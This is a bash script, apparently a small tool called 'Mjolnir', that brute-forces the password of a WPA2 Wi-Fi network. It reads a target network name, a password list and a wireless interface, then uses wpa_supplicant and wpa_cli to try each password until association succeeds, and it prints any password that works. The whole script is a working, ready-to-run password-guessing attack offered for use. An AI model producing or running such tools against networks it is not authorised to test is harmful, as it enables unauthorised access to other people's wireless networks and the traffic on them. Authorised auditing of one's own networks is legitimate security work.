#!/bin/bash

### text colours ###

red='\e[0;31m'
green='\e[0;32m'
blue='\e[0;34m'
nc='\e[0m'

### art ###

echo '
  __  __ _ _   _ _       _      
 |  \/  (_(_) (_| |     (_)     
 | \  / |_  ___ | |_ __  _ _ __ 
 | |\/| | |/ _ \| |  _ \| |  __|
 | |  | | | (_) | | | | | | |   
 |_|  |_| |\___/|_|_| |_|_|_|   
       _/ |                     
      |__/                      
                             v1
'
### input & variables ###

loc=/tmp/wpa_supplicant.conf

echo -n "Target ESSID: "
read ssid

if [ -z "$ssid" ]; then
	echo -e "${red}[x]${nc} ESSID required."
	exit 1
fi

echo -n "Password List (full path): "
read list

if [ ! -f "$list" -o -z "$list" ]; then
	echo -e "${red}[x]${nc} File not found."
	exit 1
fi

echo -n "Wireless Interface (e.g. wlan0): "
read int

if [ -z "$int" ]; then
	echo -e "${red}[x]${nc} Interface required."
	exit 1
fi

echo ""
echo -e "${blue}[-]${nc} Launching..."

psk=$(cat $list)

### functions ###

function killSup {
	echo -e "${blue}[-]${nc} Killing instances of wpa_supplicant"
	killall wpa_supplicant > /dev/null 2>&1
}

function prepConf {
	echo -e "${blue}[-]${nc} Prepping wpa_supplicant.conf"
	echo ctrl_interface=/var/run/wpa_supplicant > $loc
}

function prepSup {
	wpa_supplicant -B -Dwext -i${int} -c$loc > /dev/null 2>&1
	pid=$(ps aux | grep [D]wext | awk '{ print $2 }')
	echo -e "${blue}[-]${nc} Daemonising wpa_supplicant (PID "$pid")"
	sleep 15 
}

function clearNetworks {
	echo -e "${blue}[-]${nc} Purging network list"
	for i in `wpa_cli -i${int} list_networks | grep ^[0-9] | cut -f1`; do wpa_cli -i${int} remove_network $i; done > /dev/null 2>&1
	sleep 3
}

function addNetwork {
	echo -e "${blue}[-]${nc} Adding network entry for ${ssid}"
	wpa_cli -i${int} add_network > /dev/null 2>&1
	wpa_cli -i${int} set_network 0 auth_alg OPEN > /dev/null 2>&1
	wpa_cli -i${int} set_network 0 key_mgmt WPA-PSK > /dev/null 2>&1
	wpa_cli -i${int} set_network 0 proto RSN > /dev/null 2>&1
	wpa_cli -i${int} set_network 0 mode 0 > /dev/null 2>&1
	wpa_cli -i${int} set_network 0 ssid '"'${ssid}'"' > /dev/null 2>&1
	sleep 3
}


function mainGuess {
	echo -e "${blue}[-]${nc} Bruteforcing ${ssid}"

	for psk in `cat $list`; do

	wpa_cli -i${int} set_network 0 psk '"'${psk}'"' > /dev/null 2>&1
	wpa_cli -i${int} select_network 0 > /dev/null 2>&1
	wpa_cli -i${int} enable_network 0 > /dev/null 2>&1
	wpa_cli -i${int} reassociate > /dev/null 2>&1
	sleep 12

	netStatus=$(wpa_cli -i${int} status | grep wpa_state | cut -d"=" -f2)

	if [ "$netStatus" == "COMPLETED" ]; then
		echo -e "${green}[+] ${nc}$ssid: $psk"
	fi
	
	done
}

function cleanUp {
	echo -e "${blue}[-]${nc} Cleaning up..."
	killall wpa_supplicant > /dev/null 2>&1
	rm $loc > /dev/null 2>&1
}


killSup
prepConf
prepSup
clearNetworks
addNetwork
mainGuess &
	wait
cleanUp
